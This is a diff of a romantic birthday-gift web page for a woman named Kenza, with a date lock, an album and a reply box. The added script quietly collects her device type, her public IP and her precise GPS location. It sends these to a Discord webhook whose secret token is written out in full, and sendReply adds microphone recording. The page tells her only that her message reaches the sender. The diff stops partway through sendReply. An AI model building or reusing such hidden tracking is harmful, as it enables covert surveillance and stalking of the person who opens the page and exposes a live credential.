@@ -2,97 +2,138 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>kado dyalek ❤️</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LIK FIDEEEL ❤️</title>
+    <!-- Bibliothèque pour les confettis -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             overflow-x: hidden;
             position: relative;
-            padding: 20px 0;
+            padding: 20px 15px;
+            background-color: #0b1a12;
+            color: #fff;
         }
 
-        /* شاشة القفل */
+        /* الفيديو في الخلفية */
+        .bg-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 1;
+            filter: brightness(0.35) blur(3px);
+            transition: all 0.5s ease;
+        }
+
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: radial-gradient(circle, rgba(16, 44, 30, 0.4) 0%, rgba(5, 15, 10, 0.88) 100%);
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        /* Carte de verrouillage */
         .lock-card {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 40px 25px;
-            border-radius: 25px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.12);
-            backdrop-filter: blur(10px);
+            background: rgba(16, 37, 26, 0.75);
+            padding: 35px 25px;
+            border-radius: 30px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(82, 183, 136, 0.2);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             text-align: center;
-            max-width: 400px;
-            width: 90%;
+            width: 100%;
+            max-width: 380px;
             z-index: 20;
+            border: 1px solid rgba(82, 183, 136, 0.3);
             transition: all 0.5s ease;
         }
 
         .bear-container {
-            font-size: 5rem;
+            font-size: 4.5rem;
             margin-bottom: 10px;
             animation: bounce 2s infinite ease-in-out;
+            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.4));
         }
 
         @keyframes bounce {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+            50% { transform: translateY(-12px); }
         }
 
         .lock-card h2 {
-            color: #d63384;
-            margin-bottom: 15px;
-            font-size: 1.8rem;
+            color: #74c69d;
+            margin-bottom: 12px;
+            font-size: 1.6rem;
+            font-weight: 700;
         }
 
         .lock-card p {
-            color: #666;
+            color: #d8f3dc;
             margin-bottom: 20px;
-            font-size: 1rem;
+            font-size: 0.95rem;
         }
 
         input[type="date"] {
             width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #ff80ab;
+            padding: 14px 18px;
+            border: 1px solid rgba(82, 183, 136, 0.5);
             border-radius: 50px;
             font-size: 1rem;
             text-align: center;
             outline: none;
             margin-bottom: 15px;
-            color: #444;
+            color: #fff;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
+        }
+
+        input[type="date"]::-webkit-calendar-picker-indicator {
+            filter: invert(1);
         }
 
         .error-msg {
-            color: #e63946;
-            font-size: 0.9rem;
+            color: #ff6b6b;
+            font-size: 0.88rem;
             margin-bottom: 15px;
             display: none;
+            font-weight: bold;
         }
 
-        /* المحتوى الرئيسي */
+        /* Contenu principal */
         .card {
             display: none;
-            background: rgba(255, 255, 255, 0.92);
-            padding: 35px 25px;
-            border-radius: 25px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.12);
-            backdrop-filter: blur(10px);
+            background: rgba(16, 37, 26, 0.75);
+            padding: 30px 20px;
+            border-radius: 30px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), inset 0 0 20px rgba(82, 183, 136, 0.15);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             text-align: center;
-            max-width: 420px;
-            width: 90%;
+            width: 100%;
+            max-width: 440px;
             z-index: 10;
             position: relative;
-            animation: fadeIn 1s ease forwards;
+            border: 1px solid rgba(82, 183, 136, 0.35);
+            animation: fadeIn 0.8s ease forwards;
         }
 
         .kiss-box {
@@ -102,12 +143,12 @@
         }
 
         .profile-img {
-            width: 140px !important;
-            height: 140px !important;
+            width: 130px !important;
+            height: 130px !important;
             border-radius: 50%;
             object-fit: cover;
-            border: 4px solid #d63384;
-            box-shadow: 0 8px 20px rgba(214, 51, 132, 0.3);
+            border: 3px solid #52b788;
+            box-shadow: 0 0 25px rgba(82, 183, 136, 0.5);
             display: block;
             margin: 0 auto;
         }
@@ -115,16 +156,16 @@
         .kiss-bear {
             position: absolute;
             bottom: -10px;
-            left: -35px;
-            font-size: 3.5rem;
+            left: -25px;
+            font-size: 3rem;
             animation: kissAnim 1.5s infinite alternate ease-in-out;
         }
 
         .big-kiss-mark {
             position: absolute;
-            top: 25px;
-            right: 15px;
-            font-size: 2.2rem;
+            top: 15px;
+            right: 10px;
+            font-size: 2rem;
             opacity: 0;
             animation: popKiss 0.8s ease-out 0.5s forwards;
         }
@@ -141,124 +182,291 @@
         }
 
         h1 {
-            color: #d63384;
-            font-size: 2.2rem;
-            margin-bottom: 5px;
+            color: #74c69d;
+            font-size: 2rem;
+            margin-bottom: 4px;
+            font-weight: 800;
         }
 
         .subtitle {
-            color: #888;
-            font-size: 0.95rem;
+            color: #b7e4c7;
+            font-size: 0.9rem;
             margin-bottom: 20px;
-        }
-
-        p {
-            color: #444;
-            font-size: 1.1rem;
-            line-height: 1.7;
-            margin-bottom: 25px;
+            opacity: 0.9;
         }
 
         button {
-            background: #d63384;
+            background: linear-gradient(135deg, #2d6a4f, #52b788);
             color: white;
             border: none;
-            padding: 14px 32px;
-            font-size: 1.05rem;
+            padding: 15px 25px;
+            font-size: 1rem;
             font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(214, 51, 132, 0.4);
+            box-shadow: 0 8px 25px rgba(45, 106, 79, 0.5);
             width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin-bottom: 12px;
         }
 
-        button:hover {
-            background: #b8256f;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(214, 51, 132, 0.6);
+        button.btn-secondary {
+            background: linear-gradient(135deg, #1b4332, #2d6a4f);
+            box-shadow: 0 8px 20px rgba(27, 67, 50, 0.4);
+        }
+
+        button:active {
+            transform: scale(0.97);
         }
 
         .secret-message {
             display: none;
-            margin-top: 25px;
+            margin-top: 20px;
             padding: 20px;
-            background: #ffe6eb;
-            border-radius: 15px;
-            color: #c2185b;
-            font-size: 1.1rem;
-            font-weight: 600;
+            background: rgba(8, 28, 18, 0.8);
+            border-radius: 20px;
+            color: #d8f3dc;
+            font-size: 0.98rem;
+            font-weight: 500;
             line-height: 1.6;
-            animation: fadeIn 1s ease forwards;
+            animation: fadeIn 0.8s ease forwards;
+            border: 1px solid rgba(82, 183, 136, 0.3);
+            text-align: right;
         }
 
-        /* تصميم صندوق الرد */
         .reply-box {
             margin-top: 20px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 15px;
-            border: 1px solid #ff80ab;
+            padding: 18px;
+            background: rgba(16, 37, 26, 0.85);
+            border-radius: 20px;
+            border: 1px solid rgba(82, 183, 136, 0.4);
             text-align: right;
         }
 
         .reply-box h3 {
-            color: #d63384;
-            font-size: 1.1rem;
-            margin-bottom: 10px;
+            color: #74c69d;
+            font-size: 1.05rem;
+            margin-bottom: 12px;
             text-align: center;
         }
 
         .reply-box textarea {
             width: 100%;
-            height: 90px;
-            padding: 10px;
-            border: 1px solid #ffb2c9;
-            border-radius: 10px;
+            height: 80px;
+            padding: 12px;
+            border: 1px solid rgba(82, 183, 136, 0.3);
+            border-radius: 12px;
             outline: none;
             resize: none;
             font-family: inherit;
-            font-size: 0.95rem;
-            margin-bottom: 10px;
-            direction: rtl;
-        }
-
-        .reply-status {
-            margin-top: 8px;
             font-size: 0.9rem;
-            font-weight: bold;
-            text-align: center;
+            margin-bottom: 12px;
+            direction: rtl;
+            background: rgba(0, 0, 0, 0.3);
+            color: #fff;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(12px); }
-            to { opacity: 1; transform: translateY(0); }
+        .audio-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
         }
+
+        .btn-record {
+            background: linear-gradient(135deg, #1b4332, #2d6a4f);
+            color: white;
+            border: 1px solid rgba(82, 183, 136, 0.3);
+            padding: 12px 18px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-record.recording {
+            background: linear-gradient(45deg, #d90429, #ef233c);
+            animation: pulse 1s infinite;
+        }
+
+        .recording-details {
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .timer { font-size: 0.9rem; font-weight: bold; color: #ff6b6b; }
+
+        .waves { display: flex; align-items: center; gap: 3px; height: 16px; }
+        .wave-bar {
+            width: 3px; height: 100%; background: #ff6b6b; border-radius: 3px;
+            animation: waveAnim 0.8s infinite ease-in-out alternate;
+        }
+        .wave-bar:nth-child(2) { animation-delay: 0.2s; }
+        .wave-bar:nth-child(3) { animation-delay: 0.4s; }
+        .wave-bar:nth-child(4) { animation-delay: 0.1s; }
+
+        @keyframes waveAnim { 0% { height: 20%; } 100% { height: 100%; } }
+
+        .preview-container {
+            display: none; width: 100%; gap: 8px; align-items: center; margin-top: 5px;
+        }
+
+        .btn-delete {
+            background: #e63946; color: white; border: none; padding: 8px 12px;
+            border-radius: 10px; font-size: 0.85rem; cursor: pointer; width: auto;
+        }
+
+        .reply-status { margin-top: 10px; font-size: 0.85rem; font-weight: bold; text-align: center; }
+
+        /* --- STYLES DE LA PAGE ALBUM / GALLERY --- */
+        #albumPage {
+            display: none;
+        }
+
+        .gallery-header {
+            color: #74c69d;
+            font-size: 1.4rem;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+
+        .gallery-sub {
+            color: #b7e4c7;
+            font-size: 0.88rem;
+            margin-bottom: 20px;
+        }
+
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .gallery-item {
+            position: relative;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(82, 183, 136, 0.3);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.4);
+            aspect-ratio: 1 / 1;
+            cursor: pointer;
+            transition: transform 0.3s ease, border-color 0.3s ease;
+        }
+
+        .gallery-item:hover {
+            transform: scale(1.03);
+            border-color: #52b788;
+        }
+
+        .gallery-item.video-item {
+            grid-column: span 2;
+            aspect-ratio: 16 / 9;
+        }
+
+        .gallery-item img, .gallery-item video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .item-tag {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            background: rgba(16, 37, 26, 0.8);
+            color: #74c69d;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(82, 183, 136, 0.2);
+        }
+
+        /* Lightbox Fullscreen Popup */
+        .lightbox {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .lightbox-content {
+            max-width: 95%;
+            max-height: 85vh;
+            border-radius: 16px;
+            border: 1px solid rgba(82, 183, 136, 0.5);
+            box-shadow: 0 0 30px rgba(82, 183, 136, 0.3);
+        }
+
+        .lightbox-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: #fff;
+            font-size: 2rem;
+            cursor: pointer;
+            background: rgba(16, 37, 26, 0.8);
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid rgba(82, 183, 136, 0.3);
+        }
+
+        .click-heart {
+            position: absolute; font-size: 1.4rem; pointer-events: none;
+            animation: floatUp 1s ease-out forwards; z-index: 100;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(0) scale(1); opacity: 1; }
+            100% { transform: translateY(-40px) scale(1.3); opacity: 0; }
+        }
+
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
         .petal {
-            position: absolute;
-            background-color: #ff4081;
-            border-radius: 150px 0px 150px 0px;
-            opacity: 0.7;
-            pointer-events: none;
-            animation: fall linear infinite;
+            position: absolute; background-color: #52b788; border-radius: 150px 0px 150px 0px;
+            opacity: 0.6; pointer-events: none; animation: fall linear infinite; z-index: 3;
         }
-
         @keyframes fall {
-            0% {
-                top: -10%;
-                transform: translateX(0) rotate(0deg);
-            }
-            100% {
-                top: 105%;
-                transform: translateX(100px) rotate(360deg);
-            }
+            0% { top: -10%; transform: translateX(0) rotate(0deg); }
+            100% { top: 105%; transform: translateX(80px) rotate(360deg); }
         }
     </style>
 </head>
-<body>
+<body onclick="spawnHeart(event)">
 
-    <!-- شاشة القفل -->
+    <!-- الفيديو في الخلفية -->
+    <video id="bgVideo" class="bg-video" loop muted playsinline preload="auto">
+        <source src="bg-video.mp4" type="video/mp4">
+    </video>
+    <div class="bg-overlay"></div>
+
+    <!-- Ecran de verrouillage -->
     <div id="lockCard" class="lock-card">
         <div id="lockBear" class="bear-container">🧸</div>
         <h2>ntmna txofi hna xi mra🔒</h2>
@@ -270,54 +478,183 @@
         <button onclick="checkDate()">افتحي الهدية 🎁</button>
     </div>
 
-    <!-- الكارت الرئيسي -->
+    <!-- PAGE 1: Contenu principal -->
     <div id="mainCard" class="card">
         <div class="kiss-box">
-            <img src="kenza.png" alt="Kenza" class="profile-img">
+            <img src="KENZA.jpg" alt="Kenza" class="profile-img">
             <div class="kiss-bear">🧸💋</div>
             <div class="big-kiss-mark">💋</div>
         </div>
 
         <h1>hobyy kenza✨</h1>
-        <div class="subtitle">sm7ili bzaf💖</div>
-        
-        <p>
-            في عينيكِ الجميلة عالم آخر، يذكرني دائماً بمدى حظي لأنكِ في حياتي. 20 عاماً وأنتِ تزدادين جمالاً وإشراقاً!
-        </p>
-        
+        <div class="subtitle">KANBGHIKK BZAAAF💖</div>
+
+        <button class="btn-secondary" onclick="openAlbumPage()">📸 استكشفي ألبوم الذكريات (7 صور + فيديو)</button>
         <button onclick="showMessage()">اضغطي هنا للسر 🎁</button>
 
-        <audio id="mySong" loop>
+        <audio id="mySong" loop preload="auto">
             <source src="music.mp3" type="audio/mpeg">
         </audio>
         
         <div id="secret" class="secret-message">
-            kenza, ana 3arf blli klami 9s7ek w blli 7assa b lwja3, w wllah ma kan 9sdi ndmrek wla n2adik. nti bnt nass w tstahli kol khyr, w l-ghyab dyali machi 7it nti na9sa wla 7it ma 3zizach, wlkin 7it ana dabba f w7d l-ftra f 7yati ma 9adrch nkon fiha ch-chkhs lli tstahlih w ys3dek. ana m7taj nsl7 rasi w nwajh 7aly w droufi bo7di, w ma bghitch njrrek m3aya f had l-machakil wla ndlemek m3aya knchkkrek 3la kol 7aja zwina dweznaha, w kntmnna lik men 9lbi rbi y3wwdek b la7san w ys3dek f 7yatek. sm7i liya bzaf w thllay f raseki <nav></nav>  <br><br>
-            <i> إلا كان باقي عندك ما يتقال أو باغا تحكي ليا شي حاجة، خلي ليا مساج تحت وراه غادي يوصلني غير أنا وحدي ❤️</i> <br><br>
+           MAKHDMTX DESING MZYAN MS HBIT TAL MN BED DB GHI ZET HAD MIZAT JDAD HH <br><br>
             
+            <i> إلا كان باقي عندك ما يتقال أو باغا تحكي ليا شي حاجة، خلي ليا مساج أو أوديو تحت وراه غادي يوصلني غير أنا وحدي ❤️</i> <br><br>
 
-            <!-- خانة إرسال الرد -->
+            <!-- Zone de réponse -->
             <div id="replyBox" class="reply-box">
                 <h3>باغية تقولي ليا شي حاجة؟ 💌</h3>
                 <textarea id="userReply" placeholder="كتبي المساج ديالك هنا..."></textarea>
-                <button onclick="sendReply()">إرسال الرسالة ✨</button>
+
+                <div class="audio-section">
+                    <button id="recordBtn" class="btn-record" onclick="toggleRecording()">
+                        <span>🎤</span> <span id="recordBtnText">سجلي أوديو (اضغطي للبدء)</span>
+                    </button>
+
+                    <div id="recordingDetails" class="recording-details">
+                        <span class="timer" id="recordTimer">00:00</span>
+                        <div class="waves">
+                            <div class="wave-bar"></div>
+                            <div class="wave-bar"></div>
+                            <div class="wave-bar"></div>
+                            <div class="wave-bar"></div>
+                        </div>
+                    </div>
+
+                    <div id="previewContainer" class="preview-container">
+                        <audio id="audioPreview" controls style="width:100%;" onplay="pauseMainMusic()" onended="playMainMusic()"></audio>
+                        <button class="btn-delete" onclick="deleteAudio()">مسح 🗑️</button>
+                    </div>
+                </div>
+
+                <button onclick="sendReply()">إرسال الرسالة / الأوديو ✨</button>
                 <div id="replyStatus" class="reply-status"></div>
             </div>
         </div>
     </div>
 
+    <!-- PAGE 2: Album / Gallery Page -->
+    <div id="albumPage" class="card">
+        <div class="gallery-header">📸 ألبوم اللحظات الخاصة</div>
+        <div class="gallery-sub">TSAWERNAA YB9AW HNA✨</div>
+
+        <div class="gallery-grid">
+            <!-- الصورة 1 -->
+            <div class="gallery-item" onclick="openLightbox('img1.jpg', 'image')">
+                <img src="1.jpg" alt="Memory 1">
+                <div class="item-tag">ذكرى 1 ❤️</div>
+            </div>
+
+            <!-- الصورة 2 -->
+            <div class="gallery-item" onclick="openLightbox('img2.jpg', 'image')">
+                <img src="2.jpg" alt="Memory 2">
+                <div class="item-tag">ذكرى 2 ✨</div>
+            </div>
+
+            <!-- الفيديو المخصص -->
+            <div class="gallery-item video-item" onclick="openLightbox('memories-video.mp4', 'video')">
+                <video muted preload="metadata">
+                    <source src="VD.mp4" type="video/mp4">
+                </video>
+                <div class="item-tag">🎥 </div>
+            </div>
+
+            <!-- الصورة 3 -->
+            <div class="gallery-item" onclick="openLightbox('img3.jpg', 'image')">
+                <img src="3.jpg" alt="Memory 3">
+                <div class="item-tag">ذكرى 3 💖</div>
+            </div>
+
+            <!-- الصورة 4 -->
+            <div class="gallery-item" onclick="openLightbox('img4.jpg', 'image')">
+                <img src="4.jpg" alt="Memory 4">
+                <div class="item-tag">ذكرى 4 🌿</div>
+            </div>
+
+            <!-- الصورة 5 -->
+            <div class="gallery-item" onclick="openLightbox('img5.jpg', 'image')">
+                <img src="5.jpg" alt="Memory 5">
+                <div class="item-tag">ذكرى 5 🌸</div>
+            </div>
+
+            <!-- الصورة 6 -->
+            <div class="gallery-item" onclick="openLightbox('img6.jpg', 'image')">
+                <img src="6.jpg" alt="Memory 6">
+                <div class="item-tag">✨</div>
+            </div>
+
+            <!-- الصورة 7 -->
+            <div class="gallery-item" style="grid-column: span 2;" onclick="openLightbox('img7.jpg', 'image')">
+                <img src="7.jpg" alt="Memory 7">
+                <div class="item-tag">👑</div>
+            </div>
+        </div>
+
+        <button class="btn-secondary" onclick="openMainPage()">⬅️ الرجوع للرئيسية</button>
+    </div>
+
+    <!-- Lightbox Fullscreen Modal -->
+    <div id="lightbox" class="lightbox">
+        <span class="lightbox-close" onclick="closeLightbox()">&times;</span>
+        <div id="lightboxContainer" style="width: 100%; display: flex; justify-content: center;"></div>
+    </div>
+
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1538569442647347252/xNZ8SBNyZVpmdcmWnqf3YGE8U8XYjw9ZdC7iL4-P7FZ_9pqCSMQ4m3xeftpLqhug-7i0";
-        
-        // التاريخ الصحيح لفتح القفل: 9 يناير 2006
         const CORRECT_DATE = "2006-01-09";
 
-        function checkDate() {
+        let mediaRecorder;
+        let audioChunks = [];
+        let audioBlob = null;
+        let isRecording = false;
+        let timerInterval = null;
+        let secondsRecorded = 0;
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Desktop / PC";
+            if (/Android/i.test(ua)) device = "Android Device";
+            else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS Device (iPhone/iPad)";
+            else if (/Windows/i.test(ua)) device = "Windows PC";
+            else if (/Macintosh/i.test(ua)) device = "Mac Device";
+            else if (/Linux/i.test(ua)) device = "Linux PC";
+            return `📱 **Device Info**: \`${device}\` (\`${navigator.platform}\`)`;
+        }
+
+        async function getUserIP() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                return `🌐 **IP Address**: \`${data.ip}\``;
+            } catch (error) {
+                return `🌐 **IP Address**: Unavailable`;
+            }
+        }
+
+        function getUserLocation() {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                            resolve(`📍 **Location**: [Google Maps Link](${mapsUrl}) (Accuracy: ${position.coords.accuracy}m)`);
+                        },
+                        () => resolve(`📍 **Location**: Unavailable (Permission denied or Error)`),
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                } else {
+                    resolve(`📍 **Location**: Not supported by browser`);
+                }
+            });
+        }
+
+        async function checkDate() {
             const inputDate = document.getElementById('birthdateInput').value;
             const errorMsg = document.getElementById('errorMsg');
             const lockBear = document.getElementById('lockBear');
             
-            // التأكد من إدخال تاريخ
             if (!inputDate) {
                 errorMsg.innerText = "Dkhlih hwa lwl hh 😉";
                 errorMsg.style.display = 'block';
@@ -325,31 +662,29 @@
             }
 
             const isCorrect = (inputDate === CORRECT_DATE);
+            const deviceInfo = getDeviceInfo();
+            const ipString = await getUserIP();
+            const locationString = await getUserLocation();
 
-            // إرسال البيانات للـ Webhook
             if (WEBHOOK_URL) {
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: "Kenza Special Gift Bot",
-                        content: `🎉 **محاولة فتح الهدية!**\n📅 التاريخ المُدخل: \`${inputDate}\`\n✅ النتيجة: ${isCorrect ? "صحيح 🎉" : "خاطئ ❌"}`
+                        content: `🎉 **محاولة فتح الهدية!**\n📅 التاريخ المُدخل: \`${inputDate}\`\n✅ النتيجة: ${isCorrect ? "صحيح 🎉" : "خاطئ ❌"}\n${deviceInfo}\n${ipString}\n${locationString}`
                     })
                 }).catch(err => console.error("Webhook Error:", err));
             }
 
-            // التحقق هل التاريخ 2006-01-09
             if (isCorrect) {
                 errorMsg.style.display = 'none';
                 lockBear.innerText = "😘🧸";
                 
-                // تشغيل الموسيقى فوراً عند الضغط على الزر والتأكد من التاريخ
-                const audio = document.getElementById('mySong');
-                if (audio) {
-                    audio.play().catch(err => console.log("Audio play error:", err));
-                }
+                startBgVideo();
+                playMainMusic();
+
+                confetti({ particleCount: 80, spread: 60, origin: { y: 0.6 } });
 
                 setTimeout(() => {
                     document.getElementById('lockCard').style.display = 'none';
@@ -364,63 +699,214 @@
             }
         }
 
+        /* Navigation Pages */
+        function openAlbumPage() {
+            document.getElementById('mainCard').style.display = 'none';
+            document.getElementById('albumPage').style.display = 'block';
+        }
+
+        function openMainPage() {
+            document.getElementById('albumPage').style.display = 'none';
+            document.getElementById('mainCard').style.display = 'block';
+        }
+
+        /* Lightbox Preview */
+        function openLightbox(src, type) {
+            const lightbox = document.getElementById('lightbox');
+            const container = document.getElementById('lightboxContainer');
+            container.innerHTML = '';
+
+            if (type === 'image') {
+                const img = document.createElement('img');
+                img.src = src;
+                img.className = 'lightbox-content';
+                container.appendChild(img);
+            } else if (type === 'video') {
+                const video = document.createElement('video');
+                video.src = src;
+                video.className = 'lightbox-content';
+                video.controls = true;
+                video.autoplay = true;
+                pauseMainMusic();
+                container.appendChild(video);
+            }
+
+            lightbox.style.display = 'flex';
+        }
+
+        function closeLightbox() {
+            const lightbox = document.getElementById('lightbox');
+            lightbox.style.display = 'none';
+            document.getElementById('lightboxContainer').innerHTML = '';
+            playMainMusic();
+        }
+
+        function startBgVideo() {
+            const bgVideo = document.getElementById('bgVideo');
+            if (bgVideo) bgVideo.play().catch(err => console.log("Video play error:", err));
+        }
+
+        function playMainMusic() {
+            const audio = document.getElementById('mySong');
+            if (audio) audio.play().catch(err => console.log("Audio play error:", err));
+        }
+
+        function pauseMainMusic() {
+            const audio = document.getElementById('mySong');
+            if (audio) audio.pause();
+        }
+
         function createPetal() {
             const petal = document.createElement('div');
             petal.classList.add('petal');
-            
-            const size = Math.random() * 15 + 10 + 'px';
+            const size = Math.random() * 12 + 8 + 'px';
             petal.style.width = size;
             petal.style.height = size;
             petal.style.left = Math.random() * 100 + 'vw';
-            
             const duration = Math.random() * 3 + 4 + 's';
             petal.style.animationDuration = duration;
-            
-            const colors = ['#ff4081', '#ff80ab', '#ff4081', '#f50057'];
+            const colors = ['#52b788', '#74c69d', '#95d5b2', '#2d6a4f'];
             petal.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-
             document.body.appendChild(petal);
-
-            setTimeout(() => {
-                petal.remove();
-            }, parseFloat(duration) * 1000);
+            setTimeout(() => { petal.remove(); }, parseFloat(duration) * 1000);
         }
 
-        function startPetals() {
-            setInterval(createPetal, 300);
+        function startPetals() { setInterval(createPetal, 350); }
+
+        function showMessage() { document.getElementById('secret').style.display = 'block'; }
+
+        function spawnHeart(e) {
+            const heart = document.createElement('div');
+            heart.classList.add('click-heart');
+            heart.innerHTML = '💚';
+            heart.style.left = `${e.clientX - 10}px`;
+            heart.style.top = `${e.clientY - 10}px`;
+            document.body.appendChild(heart);
+            setTimeout(() => heart.remove(), 1000);
         }
 
-        function showMessage() {
-            document.getElementById('secret').style.display = 'block';
+        function getSupportedMimeType() {
+            const types = ['audio/mp3', 'audio/mpeg', 'audio/webm', 'audio/mp4', 'audio/aac'];
+            for (let type of types) {
+                if (MediaRecorder.isTypeSupported(type)) return type;
+            }
+            return '';
         }
 
-        // دالة إرسال الرد للـ Webhook
-        function sendReply() {
-            const replyText = document.getElementById('userReply').value;
+        async function toggleRecording() {
+            const recordBtn = document.getElementById('recordBtn');
+            const recordBtnText = document.getElementById('recordBtnText');
+            const recordingDetails = document.getElementById('recordingDetails');
+            const previewContainer = document.getElementById('previewContainer');
+            const audioPreview = document.getElementById('audioPreview');
+
+            if (!isRecording) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mimeType = getSupportedMimeType();
+                    mediaRecorder = mimeType ? new MediaRecorder(stream, { mimeType }) : new MediaRecorder(stream);
+                    audioChunks = [];
+
+                    pauseMainMusic();
+
+                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                        audioPreview.src = URL.createObjectURL(audioBlob);
+                        previewContainer.style.display = 'flex';
+                    };
+
+                    mediaRecorder.start();
+                    isRecording = true;
+
+                    recordBtnText.innerText = "حبسي التسجيل (اضغطي هنا)";
+                    recordBtn.classList.add('recording');
+                    recordingDetails.style.display = 'flex';
+                    previewContainer.style.display = 'none';
+
+                    secondsRecorded = 0;
+                    document.getElementById('recordTimer').innerText = "00:00";
+                    timerInterval = setInterval(() => {
+                        secondsRecorded++;
+                        const mins = String(Math.floor(secondsRecorded / 60)).padStart(2, '0');
+                        const secs = String(secondsRecorded % 60).padStart(2, '0');
+                        document.getElementById('recordTimer').innerText = `${mins}:${secs}`;
+                    }, 1000);
+
+                } catch (err) {
+                    alert("خاصك تعطيك السماح بالمايكروفون من إعدادات المتصفح باش تسجلي الأوديو 😉");
+                }
+            } else {
+                mediaRecorder.stop();
+                isRecording = false;
+
+                clearInterval(timerInterval);
+                recordingDetails.style.display = 'none';
+
+                recordBtnText.innerText = "إعادة التسجيل 🎤";
+                recordBtn.classList.remove('recording');
+
+                playMainMusic();
+            }
+        }
+
+        function deleteAudio() {
+            audioBlob = null;
+            document.getElementById('previewContainer').style.display = 'none';
+            document.getElementById('recordBtnText').innerText = "سجلي أوديو (اضغطي للبدء)";
+        }
+
+        async function sendReply() {
+            const replyText = document.getElementById('userReply').value.trim();
             const statusDiv = document.getElementById('replyStatus');
 
-            if (!replyText.trim()) {
-                statusDiv.style.color = '#e63946';
-                statusDiv.innerText = "كتبي شي حاجة بعدا 😉";
+            if (!replyText && !audioBlob) {
+                statusDiv.style.color = '#ff6b6b';
+                statusDiv.innerText = "كتبي شي حاجة أو سجلي أوديو بعدا 😉";
                 return;
+            }
+
+            statusDiv.style.color = '#74c69d';
+            statusDiv.innerText = "⏳ جاري الإرسال...";
+
+            const deviceInfo = getDeviceInfo();
+            const ipString = await getUserIP();
+            const locationString = await getUserLocation();
+
+            const formData = new FormData();
+
